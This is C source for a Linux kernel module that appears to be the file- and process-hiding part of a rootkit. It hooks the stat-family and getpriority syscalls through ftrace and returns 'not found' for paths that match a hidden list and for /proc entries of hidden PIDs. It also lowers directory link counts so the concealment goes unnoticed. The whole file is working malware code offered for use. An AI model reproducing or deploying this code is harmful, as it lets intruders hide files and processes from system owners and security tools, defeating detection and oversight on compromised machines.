#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hiding_stat.h"
#include "../include/hidden_pids.h"
#include "../include/hiding_directory_def.h"

#define PATH_BUF_SIZE 256

notrace bool should_hide_path(const char __user *pathname)
{
    char buf[PATH_BUF_SIZE];
    long copied;
    int i, pid;

    if (!pathname)
        return false;

    memset(buf, 0, PATH_BUF_SIZE);
    copied = strncpy_from_user(buf, pathname, PATH_BUF_SIZE - 1);
    if (copied < 0)
        return false;

    buf[PATH_BUF_SIZE - 1] = '\0';

    for (i = 0; hidden_patterns[i] != NULL; i++) {
        if (strstr(buf, hidden_patterns[i]))
            return true;
    }

    if (!strncmp(buf, "/proc/", 6)) {
        const char *after = buf + 6;
        char pid_buf[16] = {0};
        int j = 0;

        while (j < (int)sizeof(pid_buf) - 1 &&
               after[j] &&
               after[j] >= '0' && after[j] <= '9') {
            pid_buf[j] = after[j];
            j++;
        }
        pid_buf[j] = '\0';

        if (kstrtoint(pid_buf, 10, &pid) < 0)
            return false;

        if (j > 0 && (is_hidden_pid(pid) || is_child_pid(pid) || pid_is_thread(pid))) {
            if (pid == (int)task_tgid_vnr(current))
                return false;
            return true;
        }
    }

    return false;
}

static notrace int count_hidden_subdirs(const char __user *pathname_user)
{
    char pathbuf[PATH_BUF_SIZE];
    char child[PATH_BUF_SIZE];
    long copied;
    int i, cnt = 0;
    struct path p;
    int ret;

    if (!pathname_user)
        return 0;

    copied = strncpy_from_user(pathbuf, pathname_user, PATH_BUF_SIZE - 1);
    if (copied <= 0)
        return 0;
    pathbuf[PATH_BUF_SIZE - 1] = '\0';

    if (pathbuf[0] && pathbuf[strlen(pathbuf) - 1] == '/')
        pathbuf[strlen(pathbuf) - 1] = '\0';


    for (i = 0; hidden_patterns[i] != NULL; i++) {
        if (snprintf(child, sizeof(child), "%s/%s", pathbuf, hidden_patterns[i]) >= (int)sizeof(child))
            continue;

        ret = kern_path(child, LOOKUP_FOLLOW, &p);
        if (ret == 0) {
            if (S_ISDIR(d_inode(p.dentry)->i_mode))
                cnt++;
            path_put(&p);
        }
    }

    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] <= 0)
            continue;
        if (snprintf(child, sizeof(child), "%s/%d", pathbuf, hidden_pids[i]) >= (int)sizeof(child))
            continue;
        ret = kern_path(child, LOOKUP_FOLLOW, &p);
        if (ret == 0) {
            if (S_ISDIR(d_inode(p.dentry)->i_mode))
                cnt++;
            path_put(&p);
        }
    }

    return cnt;
}

static notrace void adjust_user_stat_nlink(const char __user *pathname_user, void __user *user_stat, size_t stat_size, bool is_statx)
{
    int hidden_cnt;

    if (!user_stat || !pathname_user)
        return;

    hidden_cnt = count_hidden_subdirs(pathname_user);
    if (hidden_cnt <= 0)
        return;

    if (is_statx) {
        struct statx kstx;
        if (copy_from_user(&kstx, user_stat, sizeof(kstx)))
            return;
        if (kstx.stx_nlink > (u64)hidden_cnt)
            kstx.stx_nlink -= (u64)hidden_cnt;
        else
            kstx.stx_nlink = 1;
        copy_to_user(user_stat, &kstx, sizeof(kstx));
        return;
    }

    if (stat_size == sizeof(struct stat)) {
        struct stat kst;
        if (copy_from_user(&kst, user_stat, sizeof(kst)))
            return;
        if (kst.st_nlink > (unsigned long)hidden_cnt)
            kst.st_nlink -= (unsigned long)hidden_cnt;
        else
            kst.st_nlink = 1;
        copy_to_user(user_stat, &kst, sizeof(kst));
        return;
    }

#ifdef CONFIG_KALLSYMS
    if (stat_size == sizeof(struct stat64)) {
        struct stat64 kst64;
        if (copy_from_user(&kst64, user_stat, sizeof(kst64)))
            return;
        if (kst64.st_nlink > (unsigned long)hidden_cnt)
            kst64.st_nlink -= (unsigned long)hidden_cnt;
        else
            kst64.st_nlink = 1;
        copy_to_user(user_stat, &kst64, sizeof(kst64));
        return;
    }
#endif

    return;
}


static asmlinkage long (*real_sys_statx)(const struct pt_regs *);
static asmlinkage long (*real_sys_statx32)(const struct pt_regs *);
static asmlinkage long (*real_sys_lstat)(const struct pt_regs *);
static asmlinkage long (*real_sys_lstat32)(const struct pt_regs *);
static asmlinkage long (*real_sys_stat)(const struct pt_regs *);
static asmlinkage long (*real_sys_stat32)(const struct pt_regs *);
static asmlinkage long (*real_sys_newstat)(const struct pt_regs *);
static asmlinkage long (*real_sys_newstat32)(const struct pt_regs *);
static asmlinkage long (*real_sys_newlstat)(const struct pt_regs *);
static asmlinkage long (*real_sys_newlstat32)(const struct pt_regs *);

static notrace asmlinkage long hooked_sys_statx(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->si;
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = real_sys_statx(regs);
    if (ret != 0)
        return ret;

#if defined(CONFIG_X86_64)
    adjust_user_stat_nlink(pathname, (void __user *)regs->r8, 0, true);
#else
    adjust_user_stat_nlink(pathname, (void __user *)regs->cx, 0, true);
#endif

    return ret;
}

static notrace asmlinkage long hooked_sys_statx32(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->cx;
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = real_sys_statx32(regs);
    if (ret != 0)
        return ret;

    adjust_user_stat_nlink(pathname, (void __user *)regs->bx, 0, true);

    return ret;
}

static notrace asmlinkage long hooked_sys_stat(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->di;
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = real_sys_stat(regs);
    if (ret != 0)
        return ret;

#if defined(CONFIG_X86_64)
    adjust_user_stat_nlink(pathname, (void __user *)regs->si, sizeof(struct stat), false);
#else
    adjust_user_stat_nlink(pathname, (void __user *)regs->bx, sizeof(struct stat), false);
#endif

    return ret;
}

static notrace asmlinkage long hooked_sys_stat32(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->bx;
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = real_sys_stat32(regs);
    if (ret != 0)
        return ret;

    adjust_user_stat_nlink(pathname, (void __user *)regs->cx, sizeof(struct stat), false);

    return ret;
}

static notrace asmlinkage long hooked_sys_lstat(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->di;
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = real_sys_lstat(regs);
    if (ret != 0)
        return ret;

#if defined(CONFIG_X86_64)
    adjust_user_stat_nlink(pathname, (void __user *)regs->si, sizeof(struct stat), false);
#else
    adjust_user_stat_nlink(pathname, (void __user *)regs->bx, sizeof(struct stat), false);
#endif

    return ret;
}

static notrace asmlinkage long hooked_sys_lstat32(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->bx;
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = real_sys_lstat32(regs);
    if (ret != 0)
        return ret;

    adjust_user_stat_nlink(pathname, (void __user *)regs->cx, sizeof(struct stat), false);

    return ret;
}

static notrace asmlinkage long hooked_sys_newstat(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->di;
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = real_sys_newstat(regs);
    if (ret != 0)
        return ret;

#if defined(CONFIG_X86_64)
    adjust_user_stat_nlink(pathname, (void __user *)regs->si, sizeof(struct stat), false);
#else
    adjust_user_stat_nlink(pathname, (void __user *)regs->bx, sizeof(struct stat), false);
#endif

    return ret;
}

static notrace asmlinkage long hooked_sys_newstat32(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->bx;
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = real_sys_newstat32(regs);
    if (ret != 0)
        return ret;

    adjust_user_stat_nlink(pathname, (void __user *)regs->cx, sizeof(struct stat), false);

    return ret;
}

static notrace asmlinkage long hooked_sys_newlstat(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->di;
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = real_sys_newlstat(regs);
    if (ret != 0)
        return ret;

#if defined(CONFIG_X86_64)
    adjust_user_stat_nlink(pathname, (void __user *)regs->si, sizeof(struct stat), false);
#else
    adjust_user_stat_nlink(pathname, (void __user *)regs->bx, sizeof(struct stat), false);
#endif

    return ret;
}

static notrace asmlinkage long hooked_sys_newlstat32(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->bx;
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = real_sys_newlstat32(regs);
    if (ret != 0)
        return ret;

    adjust_user_stat_nlink(pathname, (void __user *)regs->cx, sizeof(struct stat), false);

    return ret;
}

static asmlinkage long (*real_sys_getpriority)(const struct pt_regs *);
static asmlinkage long (*real_sys_getpriority32)(const struct pt_regs *);

static notrace asmlinkage long hooked_sys_getpriority(const struct pt_regs *regs)
{
    int which = regs->di;
    int who = regs->si;

    if (which == PRIO_PROCESS) {
        if (is_hidden_pid(who) || is_child_pid(who) || pid_is_thread(who))
            return -ESRCH;
    }

    return real_sys_getpriority(regs);
}

static asmlinkage long (*real_sys_newfstatat)(const struct pt_regs *);

static notrace asmlinkage long hooked_sys_newfstatat(const struct pt_regs *regs)
{
    int dfd = regs->di;
    const char __user *pathname = (const char __user *)regs->si;
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = real_sys_newfstatat(regs);
    if (ret != 0)
        return ret;

#if defined(CONFIG_X86_64)
    adjust_user_stat_nlink(pathname, (void __user *)regs->dx, sizeof(struct stat), false);
#else
    adjust_user_stat_nlink(pathname, (void __user *)regs->bx, sizeof(struct stat), false);
#endif

    return ret;
}

static asmlinkage long (*real_sys_newfstatat32)(const struct pt_regs *);

static notrace asmlinkage long hooked_sys_newfstatat32(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->cx;
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = real_sys_newfstatat32(regs);
    if (ret != 0)
        return ret;

    adjust_user_stat_nlink(pathname, (void __user *)regs->dx, sizeof(struct stat), false);

    return ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_statx",       hooked_sys_statx,       &real_sys_statx),
    HOOK("__ia32_sys_statx",      hooked_sys_statx32,     &real_sys_statx32),
    HOOK("__x64_sys_stat",        hooked_sys_stat,        &real_sys_stat),
    HOOK("__ia32_sys_stat",       hooked_sys_stat32,      &real_sys_stat32),
    HOOK("__x64_sys_lstat",       hooked_sys_lstat,       &real_sys_lstat),
    HOOK("__ia32_sys_lstat",      hooked_sys_lstat32,     &real_sys_lstat32),
    HOOK("__x64_sys_newstat",     hooked_sys_newstat,     &real_sys_newstat),
    HOOK("__ia32_sys_newstat",    hooked_sys_newstat32,   &real_sys_newstat32),
    HOOK("__x64_sys_newlstat",    hooked_sys_newlstat,    &real_sys_newlstat),
    HOOK("__ia32_sys_newlstat",   hooked_sys_newlstat32,  &real_sys_newlstat32),
    HOOK("__x64_sys_getpriority",  hooked_sys_getpriority, &real_sys_getpriority),
    HOOK("__ia32_sys_getpriority", hooked_sys_getpriority, &real_sys_getpriority32),
    HOOK("__x64_sys_newfstatat", hooked_sys_newfstatat, &real_sys_newfstatat),
    HOOK("__ia32_sys_newfstatat", hooked_sys_newfstatat32, &real_sys_newfstatat32),
};

notrace int hiding_stat_init(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hiding_stat_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
